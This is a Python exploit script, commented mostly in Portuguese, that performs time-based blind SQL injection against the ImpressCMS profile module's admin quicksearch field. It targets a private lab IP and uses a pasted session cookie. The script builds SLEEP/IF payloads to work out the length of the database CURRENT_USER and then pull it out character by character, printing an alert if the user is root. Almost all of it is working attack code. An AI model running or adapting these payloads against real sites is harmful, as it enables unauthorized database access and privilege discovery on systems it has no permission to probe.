#!/usr/bin/env python3
# Query sleep time-based xpl script to verify if web server user is root or not - Byth22 - Kellvin R.
# -*- coding: utf-8 -*-

import requests
import string

# headers and cookie setting
cookies = {
    '/impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel': 'field_name',
    '/impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel': 'ASC',
    '/impresscms/modules/profile/admin/field.php_limitsel': '15',
    '/impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel': 'default',
    'ICMSSESSION': 'agh3de1cc7q9innc9u843e87v2', # <- set your cookie
}

headers = {
    'Host': '192.168.110.140',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://192.168.110.140',
    'Connection': 'close',
    'Referer': 'http://192.168.110.140/impresscms/modules/profile/admin/field.php',
    'Upgrade-Insecure-Requests': '1',
}

def get_length():
    # Verifica se o usuário (current_user()) atende à condição
    p0 = "teste') AND (SELECT 9927 FROM (SELECT(SLEEP(2-(IF(LENGTH((SELECT CURRENT_USER())) != "
    
    # Variável para contador de tentativas acerca do tamanho do usuário
    increment = 13 # Can start at 0, but we know it contains 14 characters 
    
    # Restante da query com fechamento de comandos
    p1 = ",0,2)))))oDxU) AND ('Axxv'='Axxv"

    # Tempo base para para encontrar tamanho do nome de usuário
    base_time = 3
    
    # Looping para identificar quando o tempo de resposta for menor que 2 segundos.
    # Quando o tempo de resposta for maior que 2 segundos, o tamanho do usuário foi encontrado.
    while (base_time > 2):
        # Montador de payload/query para injetar
        p_total = p0+str(increment)+p1
        
        # Atribuição de payload/query em variável alvo da injeção
        data = 'quicksearch_mod_profile_Field='+p_total+'&button_quicksearch_mod_profile_Field=Search&filtersel=default&limitsel=15'

        # Armazenamento da resposta obtida de aplicação web vulnerável
        response = requests.post('http://192.168.110.140/impresscms/modules/profile/admin/field.php', headers=headers, cookies=cookies, data=data, verify=False)
        
        # Atribuição de tempo de tempo de resposta parao caso maior que 2 segundos, realizar a saída do looping
        base_time = response.elapsed.total_seconds()
        
        # Incrementar no possível tamanho do nome do usuário em 1 unidade
        increment+=1

    # Retornar o tamanho ao finalizar função
    return increment-1

def get_word(length):
    # Estabelecer alfabeto utilizado para encontrar letras que compoem o nome do usuário
    #alphabet = string.ascii_lowercase+'@'
    
    # Alfabeto personalizado contendo as letras que usuário possui (encurtar o tempo de advinhação)
    alphabet = "rot@lcahs"
    
    # Verifica se o usuário (current_user()) atende à condição e caso não, aguarda 10 segundos
    p0 = "teste') AND (SELECT 9927 FROM (SELECT(SLEEP(10-(IF(ORD(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),"
    
    # Continuação da injeção com comparativo
    p1 = ",1))!="
    
    # Restante da query com fechamento de comandos
    p2 = ",0,10)))))oDxU) AND ('Axxv'='Axxv"
    
    # Variável que irá armazenar as letras encontradas para o nome do usuário
    word = ''
    
    # Looping para percorrer os 14 itens do nome de usuário em busca de cada letra
    for x in range(1,length+1):
        #print (x)

        # Looping para percorrer o alphabeto que foi estipulado
        for i in alphabet:
            
            # Construção de payload/query que será executada
            p_total = p0+str(x)+p1+str(ord(i))+p2

            # Atribuição de payload/query em variável alvo da injeção
            data = 'quicksearch_mod_profile_Field='+p_total+'&button_quicksearch_mod_profile_Field=Search&filtersel=default&limitsel=15'
    
            # Armazenamento da resposta obtida de aplicação web vulnerável
            response = requests.post('http://192.168.110.140/impresscms/modules/profile/admin/field.php', headers=headers, cookies=cookies, data=data, verify=False)

            # Comparativo para adicionar na variável word a letra encontrado, pois o tempo de resposta não foi 10 segundos
            if (response.elapsed.total_seconds() < 2):
                word = word+i
                print ('[+] '+word)
                break

        # Se conter a palavra root, pause o programa e afirme que o usuário é root/dba.
        if 'root@' in word:
           print ('[!] Your user is dba/root!') 
           break

    # Retorna zero caso sucesso
    return 0

def main():
    #length = get_length()
    length = 14
    get_word(length)

main()
